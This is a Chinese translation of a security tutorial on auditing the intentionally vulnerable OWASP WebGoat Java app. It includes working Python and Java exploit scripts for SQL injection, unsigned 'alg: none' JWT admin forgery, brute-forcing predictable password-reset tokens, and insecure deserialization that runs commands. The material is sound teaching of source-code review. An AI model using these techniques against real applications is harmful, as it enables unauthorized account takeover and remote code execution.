#  Java 应用漏洞挖掘实战  
0xPat
                    0xPat  securitainment   2026-03-19 05:37  
  
<table><thead><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">原文链接</span></section></th><th style="font-weight: bold;border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">作者</span></section></th></tr></thead><tbody><tr style="border-top-width: 1px;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;margin: 0px;padding: 0px;"><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">https://0xpat.github.io/Vuln_discovery_Java/</span></section></td><td style="border: 1px solid rgb(204, 204, 204);text-align: left;margin: 0px;padding: 6px 13px;"><section><span leaf="">0xPat</span></section></td></tr></tbody></table>## Intro  
  
这次的内容有些不同。本文基于我 6 月 24 日在波兰 Ya!vaConf 上的演讲。我们将分析用 Java 编写的 WebGoat 应用程序，从源代码中发现漏洞，并使用 Python 编写利用脚本。  
## WebGoat  
  
WebGoat 是一个由 OWASP 维护的、故意设计为不安全的 Web 应用，用于教授 Web 应用安全知识。 WebGoat 使用 Spring Framework，无需多言。该应用可通过 Docker 安装。  
## 反编译  
  
我们可以直接在 GitHub 上浏览源代码，也可以提取一个包含所有内容 (代码、库、清单文件等) 的 .jar  
文件。这里我们选择后者，以模拟获得了一个已构建应用程序的场景。  
  
使用 Java Decompiler (jd-gui  
)，我们可以浏览代码并将归档文件反编译为 .java  
源文件:  
  
![jd](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgIbsxqIf1oDcCk9wC6tKj9ics8W7AUOUNVk8ALWu0sfpOMSjtstTtsicOQWjfpHvQ7JjCFEqwclLzCC1FultF4eOuOZEuxliabLM/640?wx_fmt=png&from=appmsg "")  
  
jd  
  
我们需要重点关注包含各应用模块源代码的包，如上图所示。  
## 热身 - 用户注册  
  
在深入代码寻找可利用漏洞之前，先从简单的入手——我们来找到应用程序中处理用户注册的部分，并编写代码实现自动创建新账户。  
  
搜索与注册相关的类名，我们很快找到了 org/owasp/webgoat/users/RegistrationController.java  
:  
  
![RegistrationController.java](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSjlzPevbUtx037aMIkNdmDCpXzr4HOtDPu2puIJURZuPhD5ojsV6NyMVQOA7icU5rJz0usu3MfDLWPU8FcmO5mxVXVxyuQvwFNI/640?wx_fmt=png&from=appmsg "")  
  
RegistrationController.java  
  
PostMapping  
注解 表明该方法是 /register.mvc  
端点 POST  
请求的处理器。registration  
函数会验证 username  
是否唯一，以及 password  
是否与 matchingPassword  
一致 (即 "请再次输入密码" 的提示)。验证通过后，系统会创建新用户账户并自动完成登录，这意味着我们无需单独编写登录流程。  
  
我们使用 Python  
和 requests  
库来保持会话 (通过 HTTP 头部)。  
```
def Register(session, username, password):
	session.post(
		url = webgoat_url + "/register.mvc",
		data = {
			"username" : username,
			"password" : password,
			"matchingPassword" : password,
			"agree" : "agree"}
		)

userpass = ''.join(random.choice(string.ascii_lowercase) for _ in range(7))
session = requests.Session()
Register(session, userpass, userpass)
```  
  
经过手动测试，我发现该 WebGoat 版本 (8.1.0) 需要先初始化一些与课程追踪相关的内部对象，否则会出现大量 NullPointerException  
。只需向应用发送一个 HTTP 请求即可解决:  
```
session.get(url = "http://localhost:8000/WebGoat/WebGoatIntroduction.lesson.lesson")
```  
## 代码分析与漏洞发现  
### SQL 查询  
  
SQL 查询有时仍然通过拼接用户输入来构造 (和 20 年前一样)。例如，一个存在漏洞的 SELECT  
查询可能长这样:  
```
String query = "SELECT a,b,c FROM table WHERE a=" + param;
```  
  
能匹配这行代码的正则表达式示例为: SELECT.{0,100}FROM.{1,100}\+  
。  
  
使用任意文本编辑器 (或直接用 grep  
) 搜索，我们找到了一些结果:  
  
![grep\_sql](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSj7aPxOzEibkiaT5ROCNwk58ClBS9ib89Cr7z97mahaPoeSZBNVtBzu8ibUmOhJtaQLqqL0RytegP9tUs0T3rwuzQibGJRKCTjPJK4M/640?wx_fmt=png&from=appmsg "")  
  
grep_sql  
  
Sublime Text 中使用 (?s)  
操作符来匹配多行字符串，例如当一条语句跨越多行代码时。  
  
重点关注 org/owasp/webgoat/sql_injection/introduction/SqlInjectionLesson5b.java  
，我们可以看到 POST 请求参数 userid  
(在 injectableQuery  
函数中对应 accountName  
) 被直接拼接到了 SQL 查询字符串中。  
  
![grep\_sql](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSh9ofCWrpoSJwzTpPb8BfANpFSFFDRyn1D6GNPTNnAmI4iaEEfIxYRAJwjheTXHdlqeEvEzIJE43DxibECR8exicEjfQXbibshW7YE/640?wx_fmt=png&from=appmsg "")  
  
grep_sql  
  
现在我们已掌握利用该 SQL 注入漏洞所需的全部信息。接下来向 /SqlInjection/assignment5b  
端点发送一些 payload。注意还需要提供 login_count  
值，该值应该是一个整数。  
```
def SQLInjection(session, payload):
	response = session.post(
		url = webgoat_url + "/SqlInjection/assignment5b",
		data = {"userid" : payload, "login_count" : "1",}
		)
	return response.text

sql_data = SQLInjection(session, "1")
print(sql_data)
sql_data = SQLInjection(session, "1 OR 1=1")
print(sql_data)
```  
  
执行这段代码后我们得到了 2 个响应:  
  
![SQL injection](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgCJ4Yzz9PzKibFUQYmfibAwtN7Ys6mJPEtgImrKdmh4QK12k4T0I8dSU0mly8lTzcibgbI2GgNYGzSjFrWicufxYULZ7LnMmibXWeo/640?wx_fmt=png&from=appmsg "")  
  
SQL injection  
  
我们注入了 1 OR 1=1  
，查询返回了表中的所有数据。  
### JSON Web Token 与签名  
#### JJWT 库  
  
JWT 处理不当时往往会引入漏洞。我们分析的 WebGoat 版本使用的是 JJWT  
库 0.7.0  
版本。该库源码可在 GitHub 上获取，当然也可以直接反编译。这次我们选择通过 GitHub 来研究。  
  
查看发布页面，我们找到了版本 0.7.0  
及其关联的提交 c86c775。我们可以浏览该状态下的库代码。  
  
![jjwt 0.7.0](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSgcDSiaCdG6LsPrGI0zXY0x6yibGzqQFadC6Zfib1cd8D6TdWKrUxhiaHBI9DtsaViaAOtrtIDnO7ia5KG4r47ricQ6ljGH0XSBn98G2s/640?wx_fmt=png&from=appmsg "")  
  
jjwt 0.7.0  
  
现在我们已经有了 JJWT  
库的特定版本代码。接下来阅读代码，看看该库如何处理令牌和签名。  
  
在 io.jsonwebtoken.impl.DefaultJwtParser.java  
类中有一个 parse(String jwt)  
函数:  
  
![jwt parse](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgW60OeuPCGl5wSWmCeglugnib5cX0YXWNX9BlOGpVicUANIReJ2lFl5icTBX4hbcOTicYoVNyCla0FRUo0FOaOevl9PKNh9bxcuQU/640?wx_fmt=png&from=appmsg "")  
  
jwt parse  
  
可以看出，该函数仅在令牌中存在签名时才验证签名——如果签名不存在，它只会返回一个 DefaultJwt  
对象。  
  
这里有一点值得注意——RFC 7519 规范将 JWT 定义为一种表示声明 (claims) 的方式。而 JSON Web Signature (RFC 7515) 则定义了使用数字签名保护的内容。  
  
不带签名的 JWT 应在头部包含以下信息:  
```
{
  "alg": "none",
  "typ": "JWT"
}
```  
  
关键在于，parse  
函数先检查签名是否存在，然后才验证令牌头部的 alg  
字段。因此我们可以传入一个不带签名的令牌 (形如 xxx.yyy.  
)，且不会触发任何错误。不过这不是最重要的。parse  
函数会根据签名的有无返回 DefaultJws  
或 DefaultJwt  
。Jws  
接口 继承自 Jwt  
接口，并添加了 getSignature()  
虚方法。因此一切看上去都符合 RFC 规范。  
  
使用 JJWT  
库的开发者需要注意，parse  
函数不会阻止未签名令牌的使用。DefaultJwtParser  
类还有其他函数通过 JwtHandler  
来实际验证令牌类型 (JWT vs JWS)。  
  
![jwt handler](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSjYsc4BOw5RzJia5HwxffDXeWibKzd7JFrf69D1aOm8CaPiaxibrZyBUTLsqb7oY2LGH8ev6FMffMcNJicbBIW4jkfd2eJjgLsK93AE/640?wx_fmt=png&from=appmsg "")  
  
jwt handler  
  
签名 JWT (JWS) 令牌应使用 parseClaimsJws  
函数解析，该函数调用 parse(String, JwtHandler<T>)  
重载，后者先调用 parse(String)**然后检查**  
返回的是否为 Jws  
。如果不是，则调用 onClaimsJwt  
处理器，该处理器在这种情况下被定义为抛出 UnsupportedJwtException  
(而 onClaimsJws  
处理器则直接返回令牌——见"蓝色  
"代码)。该机制可以验证我们处理的确实是一个签名令牌。  
#### 回到 WebGoat 代码  
  
接下来寻找令牌处理不当之处——是否有地方使用 parse(String)  
函数来验证 JWT 声明?搜索 jwt.{0,100}parse\(  
得到了一些结果:  
  
![grep jwt](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSiajpxs8ddZOGj19nCDNoj66VfibC1tS4keorYBCDicW4US2mS0TibFWziaEn5GuxDkMTpRsmf3BbBx4VmmhicMaVsJgTcicrStb1TIco/640?wx_fmt=png&from=appmsg "")  
  
grep jwt  
  
org/owasp/webgoat/jwt/JWTVotesEndpoint.java  
类可能存在漏洞。  
  
![JWTVotesEndpoint1](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSjPpHvZykj0XBC4ibANXXM9WJ2cYbQiciaKRhyS5WibZ8JMOiaJsF8prbe8CiadZQ5mbsuibWf9felhoBkGj5O5FluGKnuBMQk5lc9l1U/640?wx_fmt=png&from=appmsg "")  
  
JWTVotesEndpoint1  
  
可以看到，/JWT/votings  
端点未正确验证令牌签名，因为它使用了 parse(String)  
函数，且未检查返回的 Jwt  
是否为 Jws  
。该端点还会验证令牌中的 "admin" 声明，我们将设法绕过这项检查。  
  
不过在开始利用之前，先看看 JWTVotesEndpoint  
中的另一个函数:  
  
![JWTVotesEndpoint2](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSh9Gm2trBrKJIjGO43JIKeZAx6pof367aqg994ELrBciaziaBvPH39mjj1wTznLj8a2n4uCfoSuQansgglwGpbVGn3vjj3T9nAL4/640?wx_fmt=png&from=appmsg "")  
  
JWTVotesEndpoint2  
  
login  
函数可通过 Web 请求获取一个有效的非管理员令牌 (有效用户为 "Tom"、"Jerry" 和 "Sylvester"，如这行代码所示: private static String validUsers = "TomJerrySylvester";  
)。请注意，这是一个用于教学的示例漏洞应用，因此这里的 "登录" 流程和令牌获取为了练习目的做了简化 :)  
#### 回到 JJWT  
  
我实现了一个简单的 PoC 代码来测试 JJWT  
库，并验证 WebGoat 中 "admin" 声明检查的具体行为。WebGoat 使用 Base64  
编码签名密钥，我们也照做。  
```
class JWTExperiment {
    public static void main(String[] args)
    {
    	if (args.length !=1) System.exit(1);
    	String accessToken = args[0];
    	String secretKey = new String(Base64.getEncoder().encode("s3cr3t".getBytes()));

		try
		{
			System.out.println("\nWebGoat check:");
			Jwt jwt = Jwts.parser().setSigningKey(secretKey).parse(accessToken);
			Claims jwtClaims = (Claims)jwt.getBody();
			boolean jwtIsAdmin = Boolean.valueOf((String)jwtClaims.get("admin")).booleanValue();
			if (!jwtIsAdmin) System.out.println("This is 'admin' token!");
			System.out.println("Successfully 'verified' token");
		}
		catch (JwtException e) { System.out.println("Invalid JWT token\n" + e); }

		try
		{
			System.out.println("\nRight check:");
			Jws jws = Jwts.parser().setSigningKey(secretKey).parseClaimsJws(accessToken);
			Claims jwsClaims = (Claims)jws.getBody();
			boolean jwsIsAdmin = Boolean.valueOf((String)jwsClaims.get("admin")).booleanValue();
			if (!jwsIsAdmin) System.out.println("This is admin token!");
			System.out.println("Successfully verified token");
		}
		catch (JwtException e) { System.out.println("Invalid JWT token\n" + e); }

		try
		{
			System.out.println("\nExplicit JWT NOT SIGNED check:");
			Jwt jwte = Jwts.parser().setSigningKey(secretKey).parseClaimsJwt(accessToken);
			Claims jwteClaims = (Claims)jwte.getBody();
			boolean jwteIsAdmin = Boolean.valueOf((String)jwteClaims.get("admin")).booleanValue();
			if (!jwteIsAdmin) System.out.println("This is admin token!");
			System.out.println("Successfully verified NOT SIGNED token");
		}
		catch (JwtException e) { System.out.println("Invalid JWT token\n" + e); }
    }
}
```  
  
jwt.io 网站可用于生成一些示例令牌。确保填入有效的密钥。例如:  
```
{
  "typ": "JWT",
  "alg": "HS256"
}
{
  "iat": 1625322938,
  "admin": "true",
  "user": "Tom"
}
```  
  
使用 "s3cr3t" 签名后的令牌为 eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpYXQiOjE2MjUzMjI5MzgsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.Kw35LNGHuH7J97G5v1dumJSnnZ3m9nALopzhbVR7ml4  
  
以下是有效签名令牌的输出:  
  
![JWTExperiment1](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSjZZpvgiaZUzPDAialb9GtgA7uD2icJUwz6k0ETP5PJOcVJibGkqPbVWkHp82l27fSsBYbaMiaxvjagkPvxdibpd9MfdJiafpGBiaEt2Bc/640?wx_fmt=png&from=appmsg "")  
  
JWTExperiment1  
  
以及去除签名部分后的令牌输出:  
  
![JWTExperiment2](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgsynLtZCWdH68tNu9KNfG5NM8ouvKQMfm1bwPlqJ3o3O4oIyzOlIy7L3MHHC7EkibboOnt2Nd8S1MUDJPcCBibRQC7icBbu3pltY/640?wx_fmt=png&from=appmsg "")  
  
JWTExperiment2  
#### 利用 JWT 处理缺陷  
  
现在我们已掌握利用该漏洞的全部要素，可以伪造管理员令牌来执行应用中的受限操作。流程如下: 获取一个有效令牌，修改 "admin" 声明，去除签名，然后使用伪造令牌向 /JWT/votings  
端点发起认证:  
```
def GetJWT(session):
	response = session.get(
		url = "http://localhost:8000/WebGoat" + "/JWT/votings/login?user=Tom"
		)
	return response.cookies.get('access_token')

def JWTAdmin(session, token):
	response = session.post(
		url = webgoat_url + "/JWT/votings",
		cookies = {'access_token' : token}
		)
	return response.text

token = GetJWT(session)
token = jwt.decode(token,options={"verify_signature": False})
token['admin'] = 'true'
token = jwt.encode(token, "",algorithm="none")
token = '.'.join(token.split('.')[0:2]) + '.'
session.cookies.pop('access_token')
jwt_result = JWTAdmin(session, token)
print(jwt_result)
```  
  
利用成功:  
  
![JWTExploit](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSg50ibygTiaKVx7TFn6QzlFppuiahca4VUpbECWGeXIdJq1wxgsNQvial0NDVGP2twKGs0C0TWk0xM37KNeBSKm7rZXhwSoX3GVJUc/640?wx_fmt=png&from=appmsg "")  
  
JWTExploit  
### Java Random 及其可预测性  
#### 关于 Random 和 SecureRandom  
  
Java 内置的 Random  
类在给定种子的情况下，每次都会产生相同的输出 (无论是单个值还是序列)，就这么简单。详见文档。  
  
SecureRandom  
则不存在这一局限。看看下面的示例代码及其输出:  
```
Random random = new Random();
random.setSeed(1);
System.out.println(random.nextInt());

SecureRandom secureRandom = new SecureRandom();
secureRandom.setSeed(1);
System.out.println(secureRandom.nextInt());
```  
  
![random](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nShCYMPDKqRAMT6hibLyaTtX3IEJyYibbe1VIEnB3dnaV1CAdib1ut5XqXCqLzDwOcbSn9d5fWYd6gPC65pe6q54WQhac3NUDkBZf0/640?wx_fmt=png&from=appmsg "")  
  
random  
  
使用 jshell  
也可以验证同样的结果——顺便说一句，这是一个很方便的工具:  
  
![jshell](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nShznI0SA1RDkkYsDEVY0ofz0ulkZNDkCt2dbHLzpvl5jtJ0IDjNusddlgoHvYcibdZ8OYrMJ43gYpP7TnGlzcWKqJ06BqSJqib1Y/640?wx_fmt=png&from=appmsg "")  
  
jshell  
  
当使用 Random  
生成密码重置令牌等敏感数据，且种子被攻击者获知时，攻击者便可伪造令牌来入侵应用账户。  
  
当种子基于系统运行时间 (如 System.currentTimeMillis()  
) 时，生成的令牌可被暴力破解——想象一个带时间戳的密码重置请求，需要尝试多少个不同的值?一千个?很可能更少。  
#### 搜索 WebGoat 代码  
  
接下来在代码中搜索 new Random(  
的用法:  
  
![grep\_random](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSjicgaDRj9kUfzyJUlwn458hZribf1O4krHcjwGdgYS8G6EEF2xU1BicYsCNDQeXqdgxHCic7aKlWD5clvZWdoyCXOFbOD3ible6Cao/640?wx_fmt=png&from=appmsg "")  
  
grep_random  
  
果然找到了目标! org/owasp/webgoat/challenges/challenge7/PasswordResetLink.java  
  
![PasswordResetLink](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSgk4YDWTpFZBxWND2MuGpooechwibt711tiaZCKTVyJGFOVTialh2YDZbOg3Ss3GFZWwJ6gwYzztaMDHwov4nQ2UicMFBOvlxPFiaRs/640?wx_fmt=png&from=appmsg "")  
  
PasswordResetLink  
  
可以看到，createPasswordReset  
函数使用密钥的**长度**  
作为 Random  
种子来生成随机链接——这非常容易暴力破解。注意此机制仅对 "admin" 账户生效。但我们还需要找到触发该函数的 HTTP 端点。  
  
![resetPassword](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nShhmSybCPdv1nKEERu1ebydicyP4beJZZCVbIh1yPIHotfEzYDWeW5gib798obsVftB7dE8ouvWpk9XxjnfmFfqDx59nuia6iawm54/640?wx_fmt=png&from=appmsg "")  
  
resetPassword  
  
从这里我们也可以看到哪个端点负责触发密码重置流程。  
#### 验证令牌可预测性  
  
接下来重写 WebGoat 密码重置功能的相关部分，验证生成的令牌是否可预测。我们还会在利用过程中使用这段 Java 代码按需生成令牌。  
```
class RandomExperiment
{
	public String createPasswordReset(String username, String key)
	{
		Random random = new Random();
		if (username.equalsIgnoreCase("admin")) random.setSeed(key.length());
		return scramble(random, scramble(random, scramble(random, MD5.getHashString(username))));
	}

	public String createSecurePasswordReset(String username, String key)
	{
		SecureRandom random = new SecureRandom();
		if (username.equalsIgnoreCase("admin")) random.setSeed(key.length());
		return scramble(random, scramble(random, scramble(random, MD5.getHashString(username))));
	}

	public static String scramble(Random random, String inputString) {
		char[] a = inputString.toCharArray();
		for (int i = 0; i < a.length; i++)
		{
			int j = random.nextInt(a.length);
			char temp = a[i];
			a[i] = a[j];
			a[j] = temp;
		} 
		return new String(a);
	}

	public static void main(String[] args)
	{
		if (args == null || args.length < 2) {
			System.out.println("Need a username and key");
			System.exit(1);
		}
		if (args.length == 2)
		{
			String username = args[0];
			String key = args[1];
			System.out.println("Random password reset link for " + username + ":\t\t" + (new RandomExperiment()).createPasswordReset(username, key));
			System.out.println("SecureRandom password reset link for " + username + ":\t" + (new RandomExperiment()).createSecurePasswordReset(username, key));
		}
		if (args.length == 3 && args[0].equals("generate_token"))
		{
			String username = args[1];
			String key = args[2];
			System.out.println((new RandomExperiment()).createPasswordReset(username, key));
		}

	}
}
```  
  
当第一个参数为 "generate_token" 时，代码会为指定的用户名和密钥生成一个 "随机" 令牌。  
  
![RandomExperiment](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSjI4zohMfP4dLudcKRg4a11vgZwR5Z4iaBYtjxXYCjhdrmV4TN8m3l98s6mVGz1XehdXQIeetSjFJ31C07LmROQQxJR6q7rutzc/640?wx_fmt=png&from=appmsg "")  
  
RandomExperiment  
  
看起来并不怎么随机。  
#### 利用可预测的随机令牌  
  
利用脚本的流程如下: 先为 "admin" 用户发起密码重置请求 (POST /challenge/7  
)，然后调用 Java 代码生成不同密钥长度对应的令牌，逐一在应用上尝试 (GET /challenge/7/reset-password/{link}  
):  
```
def GeneratePasswordResetLink(session, user):
	session.post(
		url = webgoat_url + "/challenge/7",
		data = {"email" : user}
		)

def GeneratePasswordResetTokenJava(user, length):
	secret = ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
	token = subprocess.check_output(["java", "RandomExperiment", "generate_token", user, secret], cwd = "./RandomExperiment/", stderr=subprocess.DEVNULL)
	return token.decode("utf-8").strip()

def ResetPassword(session, reset_token):
	response = session.get(
		url = webgoat_url + "/challenge/7/reset-password/" + reset_token
		)
	return response.text


GeneratePasswordResetLink(session, "admin@domain.tld")
for i in range(1,30):
	password_reset_token = GeneratePasswordResetTokenJava("admin", i)
	result = ResetPassword(session, password_reset_token)
	if 'Success' in result:
		print("Secret length: " + str(i))
		print("Token: " + password_reset_token)
		print(result)
		break
```  
  
结果:  
  
![randomExploit](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nShzIGOEXe47m6kvrVU7eQjBps1vPhRdvP2Cf1ia51yTIuY8FBlLqBscphcjhISYibMERG78S9xqcXicjxMIsmnKT2Wqw3tYJjZ9lc/640?wx_fmt=png&from=appmsg "")  
  
randomExploit  
### 不受信任数据的反序列化  
  
这是一个非常基础的反序列化利用示例——毕竟是 WebGoat。  
#### ObjectInputStream  
  
Java 的 ObjectInputStream  
在反序列化不受信任的数据时存在安全风险，因此我们可以直接搜索应用中对它的使用。  
  
![grep\_ois](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSia4iaLcnKicE05hFw3oGtalibUN7p2MG7Ht3YaRw22pApm0zHOocvO7aqmicnrhCorCf8uZgMa0axKvyaUPz19UI5lVWatlhviawcq0/640?wx_fmt=png&from=appmsg "")  
  
grep_ois  
  
org/owasp/webgoat/deserialization/InsecureDeserializationTask.java  
类显然使用了用户提供的数据来实例化对象。  
  
![InsecureDeserializationTask](https://mmbiz.qpic.cn/mmbiz_png/h4gtbB74nSia9v4pFJzDfRf0qG4g4JUguuHsTGY5zD9hKxhNkarECs6Zicrm26fOjHic9CLKgFaIPf0NmjrmY80ABc7ehUBInB4iado8uxnPEjI/640?wx_fmt=png&from=appmsg "")  
  
InsecureDeserializationTask  
#### 代码执行 gadget  
  
接下来我们需要找到一个 gadget 类来在系统上执行任意代码。搜索 Runtime.exec()  
方法——这是一个非静态方法，因此需要 Runtime  
对象实例化，通常通过 GetRuntime()  
获取。我们构造如下多行正则: runtime.{0.200}exec  
:  
  
![runtimeexec](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSgo9steCzBguiaZ4rqcKOdrhnum5R0alIxGRdjBibfcXwbibibPXZJy8GbncCOOLQ10Q9FlXU9kPQ3GGvibVeDN57udEyMicXaW2ID30/640?wx_fmt=png&from=appmsg "")  
  
runtimeexec  
  
org/dummy/insecure/framework/VulnerableTaskHolder.java  
类有一些需要注意的地方——它会执行 sleep  
和 ping  
命令，并且要求 requestedExecutionTime  
的设置正确 (与系统时区相关):  
  
![VulnerableTaskHolder](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiaoDfJv3xloREwChK2CnA13fBN7HEPNnLMTnJkXEYceV1h1kvURe3Ria9gx3ZpADMNUqyvs7OPw6fFjeVxRx4pkiaPzUWLFGibUyk/640?wx_fmt=png&from=appmsg "")  
  
VulnerableTaskHolder  
  
接下来重写该类，创建一个简单的 Java 类来为我们序列化合适的 VulnerableTaskHolder  
对象。  
  
我添加了一个新的构造函数以支持自定义 requestedExecutionTime  
，替代默认的 LocalDateTime.now();  
。  
```
public VulnerableTaskHolder(String taskName, String taskAction, LocalDateTime taskTime ) {
	this.taskName = taskName;
	this.taskAction = taskAction;
	this.requestedExecutionTime = taskTime;
}
```  
  
注意需要创建 org.dummy.insecure.framework.VulnerableTaskHolder  
对象，因此请使用对应的 package org.dummy.insecure.framework;  
语句并创建相应的目录结构。  
  
序列化 blob 的生成代码:  
```
class DeserializationExperiment
{
    public static void main(String[] args)
    {
	    String blob = "";
        String task = "sleep 2";
        if (args.length > 0)
        {
            task = args[args.length - 1];
            if (args.length == 2 && args[0].equals("generate_payload"))
            {
                try
                {
                    VulnerableTaskHolder vth = new VulnerableTaskHolder("vulntask", task, LocalDateTime.now().minusMinutes(5));
                    ByteArrayOutputStream baos = new ByteArrayOutputStream();
                    ObjectOutputStream oos = new ObjectOutputStream(baos);
                    oos.writeObject(vth);
                    oos.close();
                    blob = Base64.getEncoder().encodeToString(baos.toByteArray());
                    System.out.println(blob); 
                }
                catch (Exception ex)
                {
                }
                return;
            }
        }
    }
}
```  
  
我们也可以这样验证反序列化:  
```
try
{
    long t1, t2;
    t1 = System.currentTimeMillis();
  	ByteArrayInputStream bais = new ByteArrayInputStream(Base64.getDecoder().decode(blob));
  	ObjectInputStream ois = new ObjectInputStream(bais);
  	Object object = ois.readObject();
    System.out.println(object.getClass());
    t2 = System.currentTimeMillis();
    System.out.println("Delay: " + (t2 - t1) + " ms");
}
catch (Exception ex)
{
	ex.printStackTrace();
}
```  
  
注意目标机器的时区。例如我的 Docker 容器时区设为 UTC，而 Kali Linux 设为 CEST，因此需要从 requestedExecutionTime  
额外减去 120 分钟。  
  
"sleep 5" 任务操作的执行示例:  
  
![DeserializationExperiment](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSiaMakMQNHiaMiaorJJp7rYX5MADbceibq9WdKHb89ej0akDobokjvY0Jh7WG4Bmrnd8QOzRyYv98iadq8RX2uQ2o188kZTbIEKcsF4/640?wx_fmt=png&from=appmsg "")  
  
DeserializationExperiment  
#### 利用不安全的反序列化  
  
这是我们今天利用的最后一个漏洞:  
```
def GenerateDeserializationPayload(command):
	payload = subprocess.check_output(["java", "-cp", "lib/slf4j-api-1.7.29.jar:.", "DeserializationExperiment", "generate_payload", command], cwd = "./DeserializationExperiment/", stderr=subprocess.DEVNULL)
	return payload.decode("utf-8").strip()

def ExploitDeserialization(session, payload):
	response = session.post(
		url = "http://localhost:8000/WebGoat" + "/InsecureDeserialization/task",
		data = {"token" : payload}
		)
	return response.text

deserialization_payload = GenerateDeserializationPayload("sleep 5")
deserialization_result = ExploitDeserialization(session, deserialization_payload);
print(deserialization_result)
```  
  
利用结果:  
  
![deserializationexploit](https://mmbiz.qpic.cn/sz_mmbiz_png/h4gtbB74nSjGF8a5U5FXiaIOE1ht0L59icFibtPGnkBTSQPO623njuwvTkBW8YTLyVTpZlmlaj6xSiazpiawneabJ8VRuX5Z1lPD0wCam5vdzzRo/640?wx_fmt=png&from=appmsg "")  
  
deserializationexploit  
## 总结  
  
我们分析并利用了 4 种因 Java 不安全编码而产生的漏洞。希望本教程对你有所帮助。  
  
写于 2021 年 6 月 23 日  
  
---  
> 免责声明：本博客文章仅用于教育和研究目的。提供的所有技术和代码示例旨在帮助防御者理解攻击手法并提高安全态势。请勿使用此信息访问或干扰您不拥有或没有明确测试权限的系统。未经授权的使用可能违反法律和道德准则。作者对因应用所讨论概念而导致的任何误用或损害不承担任何责任。  
  
  
